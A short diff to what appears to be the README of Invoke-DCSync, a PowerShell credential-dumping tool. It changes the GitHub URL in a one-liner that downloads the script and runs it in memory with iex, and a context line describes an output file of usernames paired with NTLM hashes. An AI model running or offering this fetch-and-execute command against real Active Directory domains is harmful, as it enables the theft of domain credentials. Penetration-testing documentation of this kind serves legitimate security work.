@@ -40,5 +40,5 @@ As a result, we will obtain four files located under C:\temp\ directory:
 4. **DCSync_NTLM_UserHash_Import**: Contains the tuple of username and hash
 
 ````
-iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/l4rm4nd/Invoke-DCSync/main/Invoke-DCSync.ps1')
+iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/Invoke-DCSync.ps1')
 ````
